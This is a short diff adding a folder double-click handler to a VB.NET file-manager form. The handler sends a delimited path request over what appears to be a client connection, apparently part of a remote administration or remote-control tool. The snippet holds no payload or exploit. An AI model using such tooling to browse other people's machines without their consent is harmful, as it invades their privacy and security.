@@ -110,4 +110,22 @@ Public Class FileManager_Form
             End If
         End If
     End Sub
+
+    Private Async Sub ListView1_DoubleClick(sender As Object, e As EventArgs) Handles ListView1.DoubleClick
+        If ListView1.SelectedItems.Count = 1 Then
+
+
+            If ListView1.SelectedItems(0).Tag = "FOLDER" Then
+
+                Dim newP As String = Label1.Text & ListView1.SelectedItems(0).Text & "\"
+
+                Dim o As String = Form1.PL_FM & "|SP1|" & "" & "|SP2|" & "|NO|" & "|SP2|" & newP & "|ENDING|"
+
+
+                Label1.Text = newP
+
+                Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))
+            End If
+        End If
+    End Sub
 End Class
